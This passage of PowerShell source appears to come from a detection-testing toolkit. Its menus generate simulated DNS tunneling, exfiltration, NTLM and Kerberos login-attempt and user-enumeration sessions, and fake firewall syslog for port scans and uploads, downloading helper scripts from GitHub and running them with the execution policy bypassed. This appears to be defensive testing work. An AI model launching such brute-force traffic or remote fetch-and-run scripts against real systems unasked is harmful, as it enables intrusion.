                                     @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
                                     "Please retype a valid port number"
        }
        $Env:attempt_count = 10000

        if (AskYesNo "Are you sure you want to run?") {
            $this.Run($rsgsvr.host, $rsgsvr.port, $this.rsgcli_json)
        }
    }
}

class RsgcliSmbNtlmUnauthorizedLoginAttempts : RsgcliBase {
    [string]$rsgcli_json

    RsgcliSmbNtlmUnauthorizedLoginAttempts([Properties]$props) : base ($props) {
        $file_name = "rsgcli-smb-ntlm-login-attempts-template.json"
        $this.rsgcli_json = BuildFullPath $this.rsgcli_dir ".\$($file_name)"
        if (!(IsFile $this.rsgcli_json)) {
            $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/data/$($file_name)"
            DownloadFile $url $this.rsgcli_json
        }
    }

    [void]Run() {
        Write-Host ""
        Write-Host "### Enter the RSG Server and SMB configuration"
        $rsgsvr = $this.props.SelectDefaultRsgServer()
        if ($null -eq $rsgsvr) {
            $rsgsvr = [PropsRsgSvr]::New()
            $rsgsvr.host = ReadInput "RSG Server Host" `
                                     $rsgsvr.host `
                                     @("^.+$")
            $rsgsvr.port = ReadInput "RSG Server Port" `
                                     $rsgsvr.port `
                                     @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
                                     "Please retype a valid port number"
        }
        $domain_name = ReadInput "Domain Name [1..46]" `
                                 "corp.example.com" `
                                 @("^[^.]{1,12}\.[^.]", "^.{1,46}$") `
                                 "Please retype a domain name (max 12 characters for NETBIOS domain part, max 46 characters in total)"
        $numof_attempts = ParseNumber(ReadInput "Number of attempts" `
                                                "2000" `
                                                @("^[0-9]+$") `
                                                "Please retype a valid number")

        $Env:dest_dns_domain_max46 = $domain_name
        $Env:attempt_count = $numof_attempts
        $Env:user_domain_max12 = $domain_name.Split(".")[0]
        Remove-Item Env:user_name_max14

        if (! (AskYesNo "Login attempts by random users" "N")) {
            if (AskYesNo "Login attempts by a service account?" "N") {
                $account = ReadInputByChooser "Service Account" `
                                               $null `
                                               @("NT AUTHORITY\System", "NT AUTHORITY\LocalService", "NT AUTHORITY\NetworkService") `
                                               "Please type a valid service account"
                $username = $account.Split("\\")[1]
                $Env:user_domain_max12 = "NT AUTHORITY"
            } else {
                $username = ReadInput "Username [1..14]" `
                                      (-Join (Get-Random -Count 8 -input a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z)) `
                                      @("^.{1,14}$") `
                                      "Please retype a user name (max 14 charactors)"
            }
            $Env:user_name_max14 = $username
        }
        if (AskYesNo "Are you sure you want to run?") {
            $this.Run($rsgsvr.host, $rsgsvr.port, $this.rsgcli_json)
        }
    }
}

class RsgcliLdapNtlmUnauthorizedLoginAttempts : RsgcliBase {
    [string]$rsgcli_json

    RsgcliLdapNtlmUnauthorizedLoginAttempts([Properties]$props) : base ($props) {
        $file_name = "rsgcli-ldap-ntlm-login-attempts-template.json"
        $this.rsgcli_json = BuildFullPath $this.rsgcli_dir ".\$($file_name)"
        if (!(IsFile $this.rsgcli_json)) {
            $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/data/$($file_name)"
            DownloadFile $url $this.rsgcli_json
        }
    }

    [void]Run() {
        Write-Host ""
        Write-Host "### Enter the RSG Server and LDAP configuration"
        $rsgsvr = $this.props.SelectDefaultRsgServer()
        if ($null -eq $rsgsvr) {
            $rsgsvr = [PropsRsgSvr]::New()
            $rsgsvr.host = ReadInput "RSG Server Host" `
                                     $rsgsvr.host `
                                     @("^.+$")
            $rsgsvr.port = ReadInput "RSG Server Port" `
                                     $rsgsvr.port `
                                     @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
                                     "Please retype a valid port number"
        }
        $domain_name = ReadInput "Domain Name [1..46]" `
                                 "corp.example.com" `
                                 @("^[^.]{1,12}\.[^.]", "^.{1,46}$") `
                                 "Please retype a domain name (max 12 characters for NETBIOS domain part, max 46 characters in total)"
        $numof_attempts = ParseNumber(ReadInput "Number of attempts" `
                                                "2000" `
                                                @("^[0-9]+$") `
                                                "Please retype a valid number")


        $Env:dest_dns_domain_max46 = $domain_name
        $Env:attempt_count = $numof_attempts
        $Env:user_domain_max12 = $domain_name.Split(".")[0]
        Remove-Item Env:user_name_max14

        if (! (AskYesNo "Login attempts by random users" "N")) {
            if (AskYesNo "Login attempts by a service account?" "N") {
                $account = ReadInputByChooser "Service Account" `
                                               $null `
                                               @("NT AUTHORITY\System", "NT AUTHORITY\LocalService", "NT AUTHORITY\NetworkService") `
                                               "Please type a valid service account"
                $username = $account.Split("\\")[1]
                $Env:user_domain_max12 = "NT AUTHORITY"
            } else {
                $username = ReadInput "Username [1..14]" `
                                      (-Join (Get-Random -Count 8 -input a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z)) `
                                      @("^.{1,14}$") `
                                      "Please retype a user name (max 14 charactors)"
            }
            $Env:user_name_max14 = $username
        }
        if (AskYesNo "Are you sure you want to run?") {
            $this.Run($rsgsvr.host, $rsgsvr.port, $this.rsgcli_json)
        }
    }
}

class RsgcliKerberosUnauthorizedLoginAttempts : RsgcliBase {
    [string]$rsgcli_json

    RsgcliKerberosUnauthorizedLoginAttempts([Properties]$props) : base ($props) {
        $file_name = "rsgcli-krb5-preauth-attempts-template.json"
        $this.rsgcli_json = BuildFullPath $this.rsgcli_dir ".\$($file_name)"
        if (!(IsFile $this.rsgcli_json)) {
            $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/data/$($file_name)"
            DownloadFile $url $this.rsgcli_json
        }
    }

    [void]Run() {
        Write-Host ""
        Write-Host "### Enter the RSG Server and kerberos configuration"
        $rsgsvr = $this.props.SelectDefaultRsgServer()
        if ($null -eq $rsgsvr) {
            $rsgsvr = [PropsRsgSvr]::New()
            $rsgsvr.host = ReadInput "RSG Server Host" `
                                     $rsgsvr.host `
                                     @("^.+$")
            $rsgsvr.port = ReadInput "RSG Server Port" `
                                     $rsgsvr.port `
                                     @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
                                     "Please retype a valid port number"
        }
        $domain_name = ReadInput "Domain Name" "corp.example.com" @("^.+$")
        $numof_attempts = ParseNumber(ReadInput "Number of attempts" `
                                                "100" `
                                                @("^[0-9]+$") `
                                                "Please retype a valid number")

        $Env:domain_name = $domain_name
        $Env:attempt_count = $numof_attempts
        Remove-Item Env:user_name

        if (! (AskYesNo "Login attempts by random users" "N")) {
            $username = ReadInput "Username [1..14]" `
                                  (-Join (Get-Random -Count 8 -input a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z)) `
                                  @("^.{1,14}$") `
                                  "Please retype a user name (max 14 charactors)"

            $Env:user_name = $username
        }
        if (AskYesNo "Are you sure you want to run?") {
            $this.Run($rsgsvr.host, $rsgsvr.port, $this.rsgcli_json)
        }
    }
}

class RsgcliKerberosUserEnumerationBruteForce : RsgcliBase {
    [string]$rsgcli_json

    RsgcliKerberosUserEnumerationBruteForce([Properties]$props) : base ($props) {
        $file_name = "rsgcli-krb5-user-enum-bruteforce-template.json"
        $this.rsgcli_json = BuildFullPath $this.rsgcli_dir ".\$($file_name)"
        if (!(IsFile $this.rsgcli_json)) {
            $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/data/$($file_name)"
            DownloadFile $url $this.rsgcli_json
        }
    }

    [void]Run() {
        Write-Host ""
        Write-Host "### Enter the RSG Server and kerberos configuration"
        $rsgsvr = $this.props.SelectDefaultRsgServer()
        if ($null -eq $rsgsvr) {
            $rsgsvr = [PropsRsgSvr]::New()
            $rsgsvr.host = ReadInput "RSG Server Host" `
                                     $rsgsvr.host `
                                     @("^.+$")
            $rsgsvr.port = ReadInput "RSG Server Port" `
                                     $rsgsvr.port `
                                     @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
                                     "Please retype a valid port number"
        }
        $domain_name = ReadInput "Domain Name" "corp.example.com" @("^.+$")
        $numof_attempts = ParseNumber(ReadInput "Number of attempts" `
                                                "100" `
                                                @("^[0-9]+$") `
                                                "Please retype a valid number")

        $Env:domain_name = $domain_name
        $Env:attempt_count = $numof_attempts

        if (AskYesNo "Are you sure you want to run?") {
            $this.Run($rsgsvr.host, $rsgsvr.port, $this.rsgcli_json)
        }
    }
}

class RsgcliMenu : CommandBase {
    RsgcliMenu([Properties]$props) : base($props) {
    }

    [void]Run() {
        while ($true) {
            Write-Host "************************************"
            Write-Host " 1) Generate DNS tunneling sessions"
            Write-Host " 2) Generate DNS random query sessions"
            Write-Host " 3) Generate SMTP file upload session"
            Write-Host " 4) Generate FTP file upload session"
            Write-Host " 5) Generate HTTP file upload session"
            Write-Host " 6) Generate HTTP file download session"
            Write-Host " 7) Generate HTTP unauthorized login attempt sessions"
            Write-Host " 8) Generate SMB NTLM unauthorized login attempt sessions"
            Write-Host " 9) Generate LDAP NTLM unauthorized login attempt sessions"
            Write-Host "10) Generate Kerberos unauthorized login attempt sessions"
            Write-Host "11) Generate Kerberos user enumeration brute-force sessions"
            Write-Host " q) Exit"

            try {
                :retry do {
                    $cmd = Read-Host "Please choose a menu item to run"
                    switch($cmd) {
                        "1" {
                            [RsgcliDnsTunneling]::New($this.props).Run()
                        }
                        "2" {
                            [RsgcliDnsRandomQuery]::New($this.props).Run()
                        }
                        "3" {
                            [RsgcliSmtpFileUpload]::New($this.props).Run()
                        }
                        "4" {
                            [RsgcliFtpFileUpload]::New($this.props).Run()
                        }
                        "5" {
                            [RsgcliHttpFileUpload]::New($this.props).Run()
                        }
                        "6" {
                            [RsgcliHttpFileDownload]::New($this.props).Run()
                        }
                        "7" {
                            [RsgcliHttpUnauthorizedLoginAttempts]::New($this.props).Run()
                        }
                        "8" {
                            [RsgcliSmbNtlmUnauthorizedLoginAttempts]::New($this.props).Run()
                        }
                        "9" {
                            [RsgcliLdapNtlmUnauthorizedLoginAttempts]::New($this.props).Run()
                        }
                        "10" {
                            [RsgcliKerberosUnauthorizedLoginAttempts]::New($this.props).Run()
                        }
                        "11" {
                            [RsgcliKerberosUserEnumerationBruteForce]::New($this.props).Run()
                        }
                        "q" {
                            return
                        }
                        default {
                            continue retry
                        }
                    }
                    break
                } while($true)
            } catch {
                Write-Host $_
            }
        }
    }
}

class FortigateLogs : CommandBase {
    FortigateLogs([Properties]$props) : base($props) {
    }

    [void]Run() {
        while ($true) {
            Write-Host "************************************"
            Write-Host " 1) Simulate port scan"
            Write-Host " 2) Simulate large upload"
            Write-Host " 3) Send NTLM-auth logs"
            Write-Host " q) Exit"

            try {
                :retry do {
                    $cmd = Read-Host "Please choose a menu item to run"
                    switch($cmd) {
                        "1" {
                            $this.RunPortScan()
                        }
                        "2" {
                            $this.RunLargeUpload()
                        }
                        "3" {
                            $this.RunNTLMAuth()
                        }
                        "q" {
                            return
                        }
                        default {
                            continue retry
                        }
                    }
                    break
                } while($true)
            } catch {
                Write-Host $_
            }
        }
    }

    [void]RunPortScan() {
        $file_name = "syslog-fortigate-portscan.ps1"
        $scripts_dir = BuildFullPath $this.props.home_dir ".\scripts"
        $script_file = BuildFullPath $scripts_dir $file_name

        if (!(IsDirectory $scripts_dir)) {
            New-Item -ItemType Directory -Force -Path $scripts_dir
        }

        $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/bin/$($file_name)"
        DownloadFile $url $script_file

        Write-Host ""
        Write-Host "### Enter the syslog configuration"
        $syslog = $this.props.SelectDefaultSyslogServer()
        if ($null -eq $syslog) {
            $syslog = [PropsSyslog]::New()
            $syslog.host = ReadInput "Syslog Host" `
                                     $syslog.host `
                                     @("^.+$")
            $syslog.port = ReadInput "Syslog Port" `
                                     $syslog.port `
                                     @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
                                     "Please retype a valid port number"
            $syslog.protocol = ReadInput "Syslog Protocol" `
                                         $syslog.protocol `
                                         @("^UDP|TCP|udp|tcp$") `
                                         "Please retype a valid protocol"
        }
        Write-Host ""
        Write-Host "### Enter the port scan configuration"
        $source_ip = ReadInput "Source IP" `
                               "" `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"
        $destination_ip = ReadInput "Destination IP" `
                                    "" `
                                    @($script:PATTERN_IPV4_ADDR) `
                                    "Please retype a valid IPv4 address"

        if (AskYesNo "Are you sure you want to run?") {
            $cargs = @("-ExecutionPolicy", "Bypass", $script_file,
                       "-SyslogHost", $syslog.host,
                       "-SyslogPort", $syslog.port,
                       "-SyslogProtocol", $syslog.protocol.ToUpper(),
                       "-SourceIP", $source_ip,
                       "-DestinationIP", $destination_ip)
            StartProcess "powershell.exe" $cargs
        }
    }

    [void]RunLargeUpload() {
        $file_name = "syslog-fortigate-large-upload.ps1"
        $scripts_dir = BuildFullPath $this.props.home_dir ".\scripts"
        $script_file = BuildFullPath $scripts_dir $file_name

        if (!(IsDirectory $scripts_dir)) {
            New-Item -ItemType Directory -Force -Path $scripts_dir
        }

        $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/bin/$($file_name)"
        DownloadFile $url $script_file

        Write-Host ""
        Write-Host "### Enter the syslog configuration"
        $syslog = $this.props.SelectDefaultSyslogServer()
        if ($null -eq $syslog) {
            $syslog = [PropsSyslog]::New()
            $syslog.host = ReadInput "Syslog Host" `
                                     $syslog.host `
                                     @("^.+$")
            $syslog.port = ReadInput "Syslog Port" `
                                     $syslog.port `
                                     @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
                                     "Please retype a valid port number"
            $syslog.protocol = ReadInput "Syslog Protocol" `
                                         $syslog.protocol `
                                         @("^UDP|TCP|udp|tcp$") `
                                         "Please retype a valid protocol"
        }
        Write-Host ""
        Write-Host "### Enter the file upload configuration"
        $source_ip = ReadInput "Source IP" `
                               "" `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"
        $destination_ip = ReadInput "Destination IP" `
                                    "" `
                                    @($script:PATTERN_IPV4_ADDR) `
                                    "Please retype a valid IPv4 address"
        $session_type = ReadInputByChooser "Session Type" `
                                           "https" `
                                           @("http", "https", "ssh") `
                                           "Please type a valid session type"
        $upload_size = ReadInputSize "Total upload size" "1GB" "Invalid size. Please retype the size."
        $numof_session = ParseNumber(ReadInput "Number of sessions" `
                                               "100" `
                                               @("^[0-9]+$") `
                                               "Please retype a valid number")

        if (AskYesNo "Are you sure you want to run?") {
            $cargs = @("-ExecutionPolicy", "Bypass", $script_file,
                       "-SyslogHost", $syslog.host,
                       "-SyslogPort", $syslog.port,
                       "-SyslogProtocol", $syslog.protocol.ToUpper(),
                       "-SourceIP", $source_ip,
                       "-DestinationIP", $destination_ip,
                       "-SessionType", $session_type,
                       "-TotalUploadSize", [string]$upload_size,
                       "-NumberOfRecords", [string]$numof_session)
            StartProcess "powershell.exe" $cargs
        }
    }

    [void]RunNTLMAuth() {
        $file_name = "syslog-fortigate-authlogs.ps1"
        $scripts_dir = BuildFullPath $this.props.home_dir ".\scripts"
        $script_file = BuildFullPath $scripts_dir $file_name

        if (!(IsDirectory $scripts_dir)) {
            New-Item -ItemType Directory -Force -Path $scripts_dir
        }

        $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/bin/$($file_name)"
        DownloadFile $url $script_file

        Write-Host ""
        Write-Host "### Enter the syslog configuration"
        $syslog = $this.props.SelectDefaultSyslogServer()
        if ($null -eq $syslog) {
            $syslog = [PropsSyslog]::New()
            $syslog.host = ReadInput "Syslog Host" `
                                     $syslog.host `
                                     @("^.+$")
            $syslog.port = ReadInput "Syslog Port" `
                                     $syslog.port `
                                     @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
                                     "Please retype a valid port number"
            $syslog.protocol = ReadInput "Syslog Protocol" `
                                         $syslog.protocol `
                                         @("^UDP|TCP|udp|tcp$") `
                                         "Please retype a valid protocol"
        }
        Write-Host ""
        Write-Host "### Enter the authentication logs configuration"
        $source_ip = ReadInput "Authentication Client IP" `
                               "" `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"
        $destination_ip = ReadInput "Active Directory Server IP" `
                                    "" `
                                    @($script:PATTERN_IPV4_ADDR) `
                                    "Please retype a valid IPv4 address"
        $domain = ReadInput "Domain Name" "domain" @("^.+$")
        $numof_logs = ParseNumber(ReadInput "Number of log records" `
                                            "1000" `
                                            @("^[0-9]+$") `
                                            "Please retype a valid number")
        $log_type = ReadInputByChooser "Log Type" `
                                       "success" `
                                       @("success", "failure") `
                                       "Please type a valid log type"
        switch ($log_type) {
            "success" {
                $log_type = "NTLM-auth:success"
            }
            "failure" {
                $log_type = "NTLM-auth:failure"
            }
        }
        if (AskYesNo "Are you sure you want to run?") {
            $cargs = @("-ExecutionPolicy", "Bypass", $script_file,
                       "-SyslogHost", $syslog.host,
                       "-SyslogPort", $syslog.port,
                       "-SyslogProtocol", $syslog.protocol.ToUpper(),
                       "-SourceIP", $source_ip,
                       "-DestinationIP", $destination_ip,
                       "-Domain", $domain,
                       "-Count", [string]$numof_logs,
                       "-LogType", $log_type)
            StartProcess "powershell.exe" $cargs
        }
    }
}

class CheckPointLogs : CommandBase {
    CheckPointLogs([Properties]$props) : base($props) {
    }

    [void]Run() {
        while ($true) {
            Write-Host "************************************"
            Write-Host " 1) Simulate port scan"
            Write-Host " q) Exit"

            try {
                :retry do {
                    $cmd = Read-Host "Please choose a menu item to run"
                    switch($cmd) {
                        "1" {
                            $this.RunPortScan()
                        }
                        "q" {
                            return
                        }
                        default {
                            continue retry
                        }
                    }
                    break
                } while($true)
            } catch {
                Write-Host $_
            }
        }
    }

    [void]RunPortScan() {
        $file_name = "syslog-checkpoint-portscan.ps1"
        $scripts_dir = BuildFullPath $this.props.home_dir ".\scripts"
        $script_file = BuildFullPath $scripts_dir $file_name

        if (!(IsDirectory $scripts_dir)) {
            New-Item -ItemType Directory -Force -Path $scripts_dir
        }

        $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/bin/$($file_name)"
        DownloadFile $url $script_file

        Write-Host ""
        Write-Host "### Enter the syslog configuration"
        $syslog = $this.props.SelectDefaultSyslogServer()
        if ($null -eq $syslog) {
            $syslog = [PropsSyslog]::New()
            $syslog.host = ReadInput "Syslog Host" `
                                     $syslog.host `
                                     @("^.+$")
            $syslog.port = ReadInput "Syslog Port" `
                                     $syslog.port `
                                     @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
                                     "Please retype a valid port number"
            $syslog.protocol = ReadInput "Syslog Protocol" `
                                         $syslog.protocol `
                                         @("^UDP|TCP|udp|tcp$") `
                                         "Please retype a valid protocol"
        }
        Write-Host ""
        Write-Host "### Enter the port scan configuration"
        $source_ip = ReadInput "Source IP" `
                               "" `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"
        $destination_ip = ReadInput "Destination IP" `
                                    "" `
                                    @($script:PATTERN_IPV4_ADDR) `
                                    "Please retype a valid IPv4 address"

        $app = ReadInput "Application" `
                         "HTTP" `
                         @("^.+$")

        if (AskYesNo "Are you sure you want to run?") {
            $cargs = @("-ExecutionPolicy", "Bypass", $script_file,
                       "-SyslogHost", $syslog.host,
                       "-SyslogPort", $syslog.port,
                       "-SyslogProtocol", $syslog.protocol.ToUpper(),
                       "-App", $app,
                       "-SourceIP", $source_ip,
                       "-DestinationIP", $destination_ip)
            StartProcess "powershell.exe" $cargs
        }
    }
}

class CiscoLogs : CommandBase {
    CiscoLogs([Properties]$props) : base($props) {
    }

    [void]Run() {
        while ($true) {
            Write-Host "************************************"
            Write-Host " 1) Simulate port scan"
            Write-Host " 2) Simulate large upload"
            Write-Host " 3) Send AnyConnect auth logs"
            Write-Host " q) Exit"

            try {
                :retry do {
                    $cmd = Read-Host "Please choose a menu item to run"
                    switch($cmd) {
                        "1" {
                            $this.RunPortScan()
                        }
                        "2" {
                            $this.RunLargeUpload()
                        }
                        "3" {
                            $this.RunAnyConnectAuth()
                        }
                        "q" {
                            return
                        }
                        default {
                            continue retry
                        }
                    }
                    break
                } while($true)
            } catch {
                Write-Host $_
            }
        }
    }

    [void]RunPortScan() {
        $file_name = "syslog-cisco-asa-portscan.ps1"
        $scripts_dir = BuildFullPath $this.props.home_dir ".\scripts"
        $script_file = BuildFullPath $scripts_dir $file_name

        if (!(IsDirectory $scripts_dir)) {
            New-Item -ItemType Directory -Force -Path $scripts_dir
        }

        $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/bin/$($file_name)"
        DownloadFile $url $script_file

        Write-Host ""
        Write-Host "### Enter the syslog configuration"
        $syslog = $this.props.SelectDefaultSyslogServer()
        if ($null -eq $syslog) {
            $syslog = [PropsSyslog]::New()
            $syslog.host = ReadInput "Syslog Host" `
                                     $syslog.host `
                                     @("^.+$")
            $syslog.port = ReadInput "Syslog Port" `
                                     $syslog.port `
                                     @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
                                     "Please retype a valid port number"
            $syslog.protocol = ReadInput "Syslog Protocol" `
                                         $syslog.protocol `
                                         @("^UDP|TCP|udp|tcp$") `
                                         "Please retype a valid protocol"
        }
        Write-Host ""
        Write-Host "### Enter the port scan configuration"
        $source_ip = ReadInput "Source IP" `
                               "" `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"
        $destination_ip = ReadInput "Destination IP" `
                                    "" `
                                    @($script:PATTERN_IPV4_ADDR) `
                                    "Please retype a valid IPv4 address"

        if (AskYesNo "Are you sure you want to run?") {
            $cargs = @("-ExecutionPolicy", "Bypass", $script_file,
                       "-SyslogHost", $syslog.host,
                       "-SyslogPort", $syslog.port,
                       "-SyslogProtocol", $syslog.protocol.ToUpper(),
                       "-SourceIP", $source_ip,
                       "-DestinationIP", $destination_ip)
            StartProcess "powershell.exe" $cargs
        }
    }

    [void]RunLargeUpload() {
        $file_name = "syslog-cisco-asa-large-upload.ps1"
        $scripts_dir = BuildFullPath $this.props.home_dir ".\scripts"
        $script_file = BuildFullPath $scripts_dir $file_name

        if (!(IsDirectory $scripts_dir)) {
            New-Item -ItemType Directory -Force -Path $scripts_dir
        }

        $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/bin/$($file_name)"
        DownloadFile $url $script_file

        Write-Host ""
        Write-Host "### Enter the syslog configuration"
        $syslog = $this.props.SelectDefaultSyslogServer()
        if ($null -eq $syslog) {
            $syslog = [PropsSyslog]::New()
            $syslog.host = ReadInput "Syslog Host" `
                                     $syslog.host `
                                     @("^.+$")
            $syslog.port = ReadInput "Syslog Port" `
                                     $syslog.port `
                                     @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
                                     "Please retype a valid port number"
            $syslog.protocol = ReadInput "Syslog Protocol" `
                                         $syslog.protocol `
                                         @("^UDP|TCP|udp|tcp$") `
                                         "Please retype a valid protocol"
        }
        Write-Host ""
        Write-Host "### Enter the file upload configuration"
        $source_ip = ReadInput "Source IP" `
                               "" `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"
        $destination_ip = ReadInput "Destination IP" `
                                    "" `
                                    @($script:PATTERN_IPV4_ADDR) `
                                    "Please retype a valid IPv4 address"
        $destination_port = ReadInput "Destination Port" `
                                      $null `
                                      @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
                                      "Please retype a valid port number"
        $upload_size = ReadInputSize "Total upload size" "1GB" "Invalid size. Please retype the size."
        $numof_session = ParseNumber(ReadInput "Number of sessions" `
                                               "100" `
                                               @("^[0-9]+$") `
                                               "Please retype a valid number")
        if (AskYesNo "Are you sure you want to run?") {
            $cargs = @("-ExecutionPolicy", "Bypass", $script_file,
                       "-SyslogHost", $syslog.host,
                       "-SyslogPort", $syslog.port,
                       "-SyslogProtocol", $syslog.protocol.ToUpper(),
                       "-SourceIP", $source_ip,
                       "-DestinationIP", $destination_ip,
                       "-DestinationPort", $destination_port,
                       "-TotalUploadSize", [string]$upload_size,
                       "-NumberOfRecords", [string]$numof_session)
            StartProcess "powershell.exe" $cargs
        }
    }

    [void]RunAnyConnectAuth() {
        $file_name = "syslog-cisco-any-connect-authlogs.ps1"
        $scripts_dir = BuildFullPath $this.props.home_dir ".\scripts"
        $script_file = BuildFullPath $scripts_dir $file_name

        if (!(IsDirectory $scripts_dir)) {
            New-Item -ItemType Directory -Force -Path $scripts_dir
        }

        $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/bin/$($file_name)"
        DownloadFile $url $script_file

        Write-Host ""
        Write-Host "### Enter the syslog configuration"
        $syslog = $this.props.SelectDefaultSyslogServer()
        if ($null -eq $syslog) {
            $syslog = [PropsSyslog]::New()
            $syslog.host = ReadInput "Syslog Host" `
                                     $syslog.host `
                                     @("^.+$")
            $syslog.port = ReadInput "Syslog Port" `
                                     $syslog.port `
                                     @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
                                     "Please retype a valid port number"
            $syslog.protocol = ReadInput "Syslog Protocol" `
                                         $syslog.protocol `
                                         @("^UDP|TCP|udp|tcp$") `
                                         "Please retype a valid protocol"
        }
        Write-Host ""
        Write-Host "### Enter the authentication logs configuration"
        $log_type = ReadInputByChooser "Log Type" `
                                       "all" `
                                       @("all",
                                         "ASA-6-113039",
                                         "ASA-6-716001",
                                         "ASA-6-722022",
                                         "ASA-5-722033",
                                         "ASA-5-722034",
                                         "ASA-6-722051",
                                         "ASA-6-722055",
                                         "ASA-6-722053",
                                         "ASA-4-113019",
                                         "ASA-6-716002",
                                         "ASA-6-722023") `
                                       "Please type a valid log type"
        $public_ip = "1.2.3.4"
        $user_ip = "192.168.1.1"
        if (@("all", "ASA-6-722051", "ASA-6-722055").Contains($log_type)) {
            $public_ip = ReadInput "Public IP" `
                                   $public_ip `
                                   @($script:PATTERN_IPV4_ADDR) `
                                   "Please retype a valid IPv4 address"
        }
        if ($log_type -ne "ASA-6-722055") {
            $user_ip = ReadInput "User IP" `
                                 $user_ip `
                                 @($script:PATTERN_IPV4_ADDR) `
                                 "Please retype a valid IPv4 address"
        }
        $user_id = ReadInput "User ID (Optional)" ""

        $numof_logs = ParseNumber(ReadInput "Number of log records" `
                                            "100" `
                                            @("^[0-9]+$") `
                                            "Please retype a valid number")
        $group_policy = "group"

        if (AskYesNo "Are you sure you want to run?") {
            $cargs = @("-ExecutionPolicy", "Bypass", $script_file,
                       "-SyslogHost", $syslog.host,
                       "-SyslogPort", $syslog.port,
                       "-SyslogProtocol", $syslog.protocol.ToUpper(),
                       "-UserIP", $user_ip,
                       "-PublicIP", $public_ip,
                       "-GroupPolicy", $group_policy,
                       "-Count", [string]$numof_logs,
                       "-LogType", $log_type)
            if (![string]::IsNullOrEmpty($user_id)) {
                $cargs += @("-UserID", $user_id)
            }
            StartProcess "powershell.exe" $cargs
        }
    }
}


class PaloAltoNGFWLogs : CommandBase {
    PaloAltoNGFWLogs([Properties]$props) : base($props) {
    }

    [void]Run() {
        while ($true) {
            Write-Host "************************************"
            Write-Host " 1) Simulate port scan"
            Write-Host " 2) Send a threat log"
            Write-Host " q) Exit"

            try {
                :retry do {
                    $cmd = Read-Host "Please choose a menu item to run"
                    switch($cmd) {
                        "1" {
                            $this.RunPortScan()
                        }
                        "2" {
                            $this.RunSendingThreatLog()
                        }
                        "q" {
                            return
                        }
                        default {
                            continue retry
                        }
                    }
                    break
                } while($true)
            } catch {
                Write-Host $_
            }
        }
    }

    [void]RunPortScan() {
        $file_name = "syslog-palo-alto-ngfw-portscan.ps1"
        $scripts_dir = BuildFullPath $this.props.home_dir ".\scripts"
        $script_file = BuildFullPath $scripts_dir $file_name

        if (!(IsDirectory $scripts_dir)) {
            New-Item -ItemType Directory -Force -Path $scripts_dir
        }

        $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/bin/$($file_name)"
        DownloadFile $url $script_file

        Write-Host ""
        Write-Host "### Enter the syslog configuration"
        $syslog = $this.props.SelectDefaultSyslogServer()
        if ($null -eq $syslog) {
            $syslog = [PropsSyslog]::New()
            $syslog.host = ReadInput "Syslog Host" `
                                     $syslog.host `
                                     @("^.+$")
            $syslog.port = ReadInput "Syslog Port" `
                                     $syslog.port `
                                     @("^([0-9]{1,4}|6553[0-4]|655[0-3][0-4]|65[0-5][0-3][0-4]|6[0-5][0-5][0-3][0-4]|[0-5][0-9]{4})$") `
                                     "Please retype a valid port number"
            $syslog.protocol = ReadInput "Syslog Protocol" `
                                         $syslog.protocol `
                                         @("^UDP|TCP|udp|tcp$") `
                                         "Please retype a valid protocol"
        }
        Write-Host ""
